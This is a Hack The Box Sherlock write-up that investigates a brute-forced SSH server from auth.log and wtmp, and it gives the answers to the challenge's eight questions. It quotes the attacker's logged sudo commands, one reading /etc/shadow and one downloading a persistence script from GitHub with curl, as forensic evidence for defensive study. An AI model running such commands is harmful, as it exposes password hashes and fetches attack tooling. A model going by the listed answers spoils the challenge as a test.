---
title: "HTB Sherlock: Brutus"
author: baraka
date: 2026-10-28 15:30:00 +0300
description: A Hack The Box Sherlock writeup. A brute-forced SSH server investigated from auth.log and wtmp, from the first guessed password to a downloaded script.
image:
  path: /assets/images/Brutus_blog/banner.png
  alt: The Hack The Box Sherlock card for Brutus, rated Very Easy, with 195 XP.
categories: [ Security, HTB Sherlocks ]
tags: [ HTB, Sherlocks, Brutus, Linux Forensics, auth.log, wtmp, SSH, Brute Force, MITRE ATT&CK, DFIR ]
---

**Prepared by:** Mulandii · **Difficulty:** Very Easy

## Description

An SSH server running Confluence on an AWS instance was brute-forced. We are given the server's authentication log and its login records, and we have to reconstruct what the attacker did: how they got in, how they stayed in, and what they ran.

## Artifacts Provided

`Brutus.zip` (SHA-256 `dd7742375a19b6ccc4323058224460a5220c43d4e9f7565b653bd369b8c46b2d`), password `hacktheblue`, containing:

| File | What it is |
|---|---|
| `auth.log` | The Linux authentication log: SSH logins, `sudo`, account changes and cron. 385 lines. |
| `wtmp` | A binary record of every login session. It needs a parser to read. |
| `utmp.py` | The parser that HTB provides for `wtmp`. |

## Skills Learnt

* Linux log analysis with `grep`, `sort` and `uniq`
* Spotting a brute-force pattern in SSH logs
* Correlating `auth.log` with `wtmp`
* Mapping attacker actions to MITRE ATT&CK

## Initial Analysis

The zip is AES-encrypted, so the usual `unzip` skips the files with `unsupported compression method 99`. `bsdtar` handles it:

```bash
mkdir Brutus_extracted && cd Brutus_extracted
bsdtar --passphrase hacktheblue -xf ../Brutus.zip
sha256sum auth.log wtmp utmp.py
```

| File | SHA-256 |
|---|---|
| `auth.log` | `66bdba9ff1688766876deadc19ab5ddb2b0bce6a638bf255586a863260f58b9e` |
| `wtmp` | `dddc32ea65ed9972b0ee9802f95b20d4b6b98c0d5b4930f6d2302f2740458576` |
| `utmp.py` | `561f0d4e696f939d6f1ae72e7b072597811612fa1a63302ace3d17d5ca3004ce` |

The host is `ip-172-31-35-28`. Of the 385 lines in `auth.log`, 104 are `CRON` entries run as a `confluence` user, which is why the case describes a Confluence server. The other 257 are `sshd`, and that is where the incident is.

> Open evidence files in a plain text viewer or the terminal, and never in an office program. I first opened `auth.log` just to see what was inside. The file is small, so a plain text editor such as Notepad shows it fine. In LibreOffice, though, the save reflowed the log from 385 lines into 2 and added backslashes to every bracket. I restored it from the zip and checked the hash above.
{: .prompt-warning }

## Questions

### 1. Analyze the auth.log. What is the IP address used by the attacker to carry out a brute force attack?

A brute force leaves many failed logins from one source. We filter for failures and count them by source address:

```bash
grep 'Failed password' auth.log | grep -oE 'from [0-9.]+' | sort | uniq -c
```

![Desktop View](/assets/images/Brutus_blog/task1-failed-by-ip.png)
_All 48 failed passwords come from a single address_

`sort` goes before `uniq -c` because `uniq` only collapses lines that sit next to each other.

All 48 failures come from one address, and no other address has a single failure. Two details make it look automated:

* **Speed.** All 48 fall between 06:31:33 and 06:31:42, a window of 9 seconds.
* **Accounts.** The failures spread across five usernames, so the tool was guessing at account names too:

| Username | Failed attempts | Exists on the server? |
|---|---|---|
| `server_adm` | 12 | no |
| `svc_account` | 11 | no |
| `admin` | 10 | no |
| `backup` | 9 | yes |
| `root` | 6 | yes |

`sshd` also logged `beginning MaxStartups throttling` at 06:31:31 and later `21 connections dropped`, so the attacker opened connections faster than the server would accept them.

**Answer:** `65.2.161.68`

### 2. The bruteforce attempts were successful and attacker gained access to an account on the server. What is the username of the account?

Failures show the attempts and `Accepted` lines show the result:

```bash
grep 'Accepted' auth.log
grep 'Accepted' auth.log | grep 65.2.161.68
```

![Desktop View](/assets/images/Brutus_blog/task2-accepted-logins.png)
_All successful logins, then only the ones from the attacker's address_

| Time | User | Source address |
|---|---|---|
| 06:19:54 | `root` | `203.101.190.9` |
| 06:31:40 | `root` | `65.2.161.68` |
| 06:32:44 | `root` | `65.2.161.68` |
| 06:37:34 | `cyberjunkie` | `65.2.161.68` |

The attacker got in as `root`, one of the accounts the brute force targeted. `cyberjunkie` was never guessed. The attacker created it themselves (Question 5).

The first line is a login from a different address, which we do not count as the attacker's. It has no failed attempts before it, it happened 12 minutes before the attack began, and `wtmp` shows the same address logging in as `root` on 2024-01-25 and 2024-02-11. That is evidence against it, though the logs cannot prove who used it.

**Answer:** `root`

### 3. Identify the UTC timestamp when the attacker logged in manually to the server and established a terminal session to carry out their objectives.

The two files record different events. `auth.log` records **authentication**, the moment the password was accepted. `wtmp` records a **session**, the moment a terminal was opened.

`wtmp` is binary, so we use the provided parser. It prints times in the local timezone of the machine, and ours is UTC+3, so we set `TZ=UTC`:

```bash
TZ=UTC python3 -I utmp.py wtmp
```

(`-I` stops Python importing code from the current directory, which holds files from a downloaded archive.)

![Desktop View](/assets/images/Brutus_blog/task3-wtmp-login.png)
_The `wtmp` rows for the incident, with the manual root session circled_

Only one root login from the attacker's address appears in `wtmp`:

```
USER  2549  pts/1  root         65.2.161.68  2024/03/06 06:32:45
DEAD  2491  pts/1                            2024/03/06 06:37:24
USER  2667  pts/1  cyberjunkie  65.2.161.68  2024/03/06 06:37:35
```

`auth.log` has two root logins from this address, so the one at 06:31:40 never got a terminal. That is the automated brute-force success, which opened and closed in the same second. The one at 06:32:44 is the person at the keyboard. It appears in `wtmp` one second later because the terminal opens just after authentication.

To check the parser we also read the raw value from the binary. The record holds the epoch `1709706765`, which is `2024-03-06 06:32:45 UTC`.

> The parser prints dates with slashes (`2024/03/06`), and my first attempt in that format was rejected. HTB accepted the ISO form with dashes, as shown in the answer.
{: .prompt-tip }

**Answer:** `2024-03-06 06:32:45`

### 4. SSH login sessions are tracked and assigned a session number upon login. What is the session number assigned to the attacker's session for the user account from Question 2?

`systemd-logind` numbers every login with a `New session` line:

```bash
grep 'New session' auth.log
```

![Desktop View](/assets/images/Brutus_blog/task4-new-session.png)
_`systemd-logind` assigns session 37 to the 06:32:44 root login_

| Time | User | Session |
|---|---|---|
| 06:19:54 | root, other address | 6 |
| 06:31:40 | root, automated login | 34 |
| 06:32:44 | root, manual login | **37** |
| 06:37:34 | cyberjunkie | 49 |

`root` has three sessions, so the username alone is not enough. The timestamp picks the right one: 06:32:44 is the manual login from Question 3. The two files also link through the sshd process ID, 2491, which appears as `sshd[2491]` in `auth.log` and in the `DEAD` record in `wtmp`.

**Answer:** `37`

### 5. The attacker added a new user as part of their persistence strategy on the server and gave this new user account higher privileges. What is the name of this account?

Account changes are logged by the tools that make them: `useradd`, `usermod` and `groupadd`.

```bash
grep -E 'useradd|usermod|groupadd' auth.log
grep -E 'useradd' auth.log
```

![Desktop View](/assets/images/Brutus_blog/task5-new-user.png)
_Account creation and the `sudo` group change_

```
06:34:18  groupadd  new group: name=cyberjunkie, GID=1002
06:34:18  useradd   new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie, shell=/bin/bash, from=/dev/pts/1
06:35:15  usermod   add 'cyberjunkie' to group 'sudo'
```

* `from=/dev/pts/1` is the same terminal that `wtmp` recorded for the manual root session, so the account was created from that session.
* The `sudo` group is the privilege escalation. A member can run any command as root.
* A `passwd` change at 06:34:26 and a `chfn` at 06:34:31 show the account got a password and profile details within a minute of creation.

**Answer:** `cyberjunkie`

### 6. What is the MITRE ATT&CK sub-technique ID used for persistence by creating a new account?

The attacker created a user on the machine itself, which is a local account, not a domain or cloud one. That is **Create Account: Local Account**.

**Answer:** `T1136.001`

### 7. What time did the attacker's first SSH session end according to auth.log?

Sessions end with a `Removed session` line from `systemd-logind` and a matching `session closed` line from `sshd`:

```bash
grep -E 'Removed session|session closed for user root' auth.log
```

![Desktop View](/assets/images/Brutus_blog/task7-session-end.png)
_Session 37 closes at 06:37:24_

```
06:37:24  sshd[2491]: Received disconnect from 65.2.161.68 port 53184:11: disconnected by user
06:37:24  systemd-logind: Session 37 logged out.
06:37:24  systemd-logind: Removed session 37.
```

The session lasted from 06:32:44 to 06:37:24, which is 4 minutes and 40 seconds. The attacker closed it themselves, and `wtmp` agrees with a `DEAD` record at the same second. Ten seconds later they logged in again as `cyberjunkie`.

The wording is ambiguous, because session 34 was technically the attacker's first and it ended at 06:31:40, the same second it opened. We read "first SSH session" as the terminal session followed since Question 3, and HTB accepted that reading.

**Answer:** `2024-03-06 06:37:24`

### 8. The attacker logged into their backdoor account and utilized their higher privileges to download a script. What is the full command executed using sudo?

`sudo` logs the full command line of every use:

```bash
grep 'COMMAND' auth.log
```

![Desktop View](/assets/images/Brutus_blog/task8-sudo-commands.png)
_Both sudo commands run by `cyberjunkie`_

```
06:37:57  cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
06:39:38  cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```

The first command reads `/etc/shadow`, the file of password hashes, which only root can read. The second downloads a script from a public GitHub repository, and it is the one the question asks for.

`auth.log` records the **download**. It does not show the script being run or saved, so we do not claim either, and we did not fetch the script. From its name and repository it looks like a persistence tool, but that is a guess, not a finding.

**Answer:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

## Summary

The attacker ran a 9-second brute force from `65.2.161.68` and guessed the `root` password. They came back about a minute later by hand, and from that terminal created the account `cyberjunkie`, added it to the `sudo` group and logged out. They then logged in as `cyberjunkie`, read `/etc/shadow` with `sudo` and downloaded a script from GitHub. The log does not say whether the script was run. The whole intrusion in the log lasts about 8 minutes.

![Desktop View](/assets/images/Brutus_blog/solved.png)
_Brutus solved on 28 Oct 2026, Sherlock rank #41082_
